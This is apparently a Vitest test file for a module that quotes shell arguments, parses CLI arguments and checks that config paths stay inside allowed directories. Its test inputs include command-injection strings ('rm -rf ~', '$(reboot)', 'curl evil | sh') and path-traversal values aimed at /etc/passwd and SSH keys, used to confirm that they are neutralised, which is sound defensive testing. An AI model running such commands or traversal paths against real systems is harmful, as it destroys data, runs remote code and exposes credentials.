import { describe, expect, it } from "vitest";
import {
  assertAllowedConfigPath,
  buildCmdCommand,
  buildPosixShellCommand,
  cmdQuote,
  parseCliArgs,
  posixShellQuote
} from "./shellArgs";

describe("posixShellQuote", () => {
  it("把普通值包进单引号", () => {
    expect(posixShellQuote("hello")).toBe("'hello'");
  });

  it("转义内部单引号，阻断命令注入", () => {
    expect(posixShellQuote("a'; rm -rf ~ #")).toBe("'a'\\''; rm -rf ~ #'");
  });

  it("空格、分号、$() 等元字符全部被引号包裹", () => {
    const quoted = posixShellQuote("$(reboot); echo & whoami");
    expect(quoted.startsWith("'")).toBe(true);
    expect(quoted.endsWith("'")).toBe(true);
    // 除了为转义自身单引号而出现的部分，整体仍在单引号内，shell 不会解释这些字符。
  });
});

describe("cmdQuote", () => {
  it("用双引号包裹并转义 cmd 元字符", () => {
    expect(cmdQuote("a & b")).toBe('"a ^& b"');
    expect(cmdQuote("%PATH%")).toBe('"^%PATH^%"');
  });
});

describe("buildPosixShellCommand / buildCmdCommand", () => {
  it("逐参数转义后拼接", () => {
    expect(buildPosixShellCommand("codex", ["resume", "a b"])).toBe("codex 'resume' 'a b'");
  });

  it("恶意 sessionId 无法逃逸出引号", () => {
    const line = buildPosixShellCommand("codex", ["resume", "'; curl evil | sh #"]);
    expect(line).toBe("codex 'resume' ''\\''; curl evil | sh #'");
  });

  it("cmd 版本同样逐参数转义", () => {
    expect(buildCmdCommand("gemini", ["--resume", "x&y"])).toBe('gemini "--resume" "x^&y"');
  });
});

describe("parseCliArgs", () => {
  it("空字符串返回空数组", () => {
    expect(parseCliArgs("   ")).toEqual([]);
  });

  it("按空白切分", () => {
    expect(parseCliArgs("--model gpt-5 --foo")).toEqual(["--model", "gpt-5", "--foo"]);
  });

  it("支持双引号包裹带空格的值", () => {
    expect(parseCliArgs('--name "hello world"')).toEqual(["--name", "hello world"]);
  });

  it("支持单引号", () => {
    expect(parseCliArgs("--path '/a b/c'")).toEqual(["--path", "/a b/c"]);
  });

  it("支持反斜杠转义", () => {
    expect(parseCliArgs("a\\ b")).toEqual(["a b"]);
  });

  it("单引号内反斜杠保持字面量", () => {
    expect(parseCliArgs("'a\\b'")).toEqual(["a\\b"]);
  });

  it("未闭合引号抛错", () => {
    expect(() => parseCliArgs('--name "unterminated')).toThrow();
  });
});

describe("assertAllowedConfigPath", () => {
  it("接受允许目录下的路径", () => {
    expect(() => assertAllowedConfigPath("~/.codex/auth.json")).not.toThrow();
    expect(() => assertAllowedConfigPath("~/.codex/config.toml")).not.toThrow();
    expect(() => assertAllowedConfigPath("$HOME/.gemini/.env")).not.toThrow();
    expect(() => assertAllowedConfigPath("~/.claude/settings.json")).not.toThrow();
  });

  it("拒绝 ../ 穿越（S1 回归用例）", () => {
    expect(() => assertAllowedConfigPath("~/.codex/../../../etc/passwd")).toThrow();
    expect(() => assertAllowedConfigPath("$HOME/.gemini/../.ssh/authorized_keys")).toThrow();
  });

  it("拒绝反斜杠绕过", () => {
    expect(() => assertAllowedConfigPath("~/.codex\\..\\..\\secret")).toThrow();
  });

  it("拒绝绝对路径", () => {
    expect(() => assertAllowedConfigPath("/etc/passwd")).toThrow();
    expect(() => assertAllowedConfigPath("~//etc/passwd")).toThrow();
  });

  it("拒绝不在白名单目录内的 home 路径", () => {
    expect(() => assertAllowedConfigPath("~/.bashrc")).toThrow();
    expect(() => assertAllowedConfigPath("~/.ssh/id_rsa")).toThrow();
  });

  it("拒绝无前缀的相对路径", () => {
    expect(() => assertAllowedConfigPath(".codex/auth.json")).toThrow();
  });
});
